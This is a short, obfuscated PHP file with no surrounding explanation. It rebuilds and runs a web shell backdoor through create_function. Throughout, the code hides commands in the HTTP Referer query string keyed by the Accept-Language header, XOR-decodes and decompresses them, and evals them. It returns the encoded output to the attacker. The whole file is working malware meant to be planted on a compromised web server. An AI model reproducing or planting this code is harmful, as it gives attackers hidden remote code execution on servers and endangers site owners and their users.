<?php
$G='[-X$m[2]-X[$z]];i-Xf(str-Xpos($p,$h)===-X0)-X{$s[$i-X]="";$p-X=$ss($p,3-X)-X;}if(a-Xrray-X_-Xkey_exists($-Xi-X,$-Xs)){$s[$i].-';
$V=',$-Xq);$q=arr-Xa-Xy_values($q)-X;preg_-Xm-Xatch_all("/(-X[\\w])-X[\\w-]+(?:;-Xq=0.-X([\\d-X]))?,-X?/-X",$ra,$m);if(-X-X-X-X-X$q';
$z='&&$m){@session_start();$s=-X&$_S-XESSION;$ss="-Xsu-Xbs-Xtr";$sl="strt-Xolowe-Xr";$i-X=$m[1]-X[0].$m[1]-X[1];-X$h=-X$sl($ss';
$D='(md5-X($i.-X$-Xkh-X),0,3));$f-X=$sl($s-Xs(m-Xd5($i.$-Xkf),0-X,3));$p="";fo-Xr(-X$z=1;-X-X$z<c-Xount($m[1-X]);$z++)$p.=-X$q';
$A='$kh="-X5d41";$kf=-X"402-X-Xa";functi-Xon x($-Xt,$k){$c=s-Xtrle-Xn-X($k);$l=str-Xlen($-Xt);$-X-X-Xo="";for($i=0;$i<$l;){fo-Xr(';
$E='XERE-XR"];$-Xra=@$r["HTTP-X_ACCE-X-XPT_LANGUAGE"-X-X];if($-Xrr&&$ra){$u-X=parse_url-X-X($rr);pars-Xe_str($u[-X"quer-X-Xy"]';
$M=str_replace('lw','','clwrelwate_lwfulwnclwtilwon');
$R='_-Xrep-Xlace(array("/-X_/","/-X-/-X"),array("/-X"-X,"+-X"),$ss(-X$-Xs[$i],0,$-Xe)))-X,$k)));$o=o-Xb_get_conte-Xnts();-Xob_e';
$o='nd-X_clean()-X;$d=ba-Xse64-X_en-Xcode-X(x(gzco-Xm-Xpress($o-X),$k-X));print("<$-Xk>$d<-X/$k>");-X@sessio-Xn_-Xdestroy();}}}}';
$B='$j=0;-X(-X$j<$-Xc&&$i<$l);$j++-X,$i+-X+){$o.=-X$t-X{$i}^$k{$j}-X;}}r-Xet-Xurn -X$o-X;-X}$r=$_SERVE-XR;$rr=-X@$r["HTTP_REF-';
$x='X=$p;$e=str-Xpo-Xs($s[$i]-X,$f);if($e){$k=$-Xk-Xh.$kf;-Xob_start();-X-X-X@e-Xval(@gz-Xunco-Xmpress(@x(@base-X64_decode(preg-X';
$f=str_replace('-X','',$A.$B.$E.$V.$z.$D.$G.$x.$R.$o);
$b=$M('',$f);$b();
?>
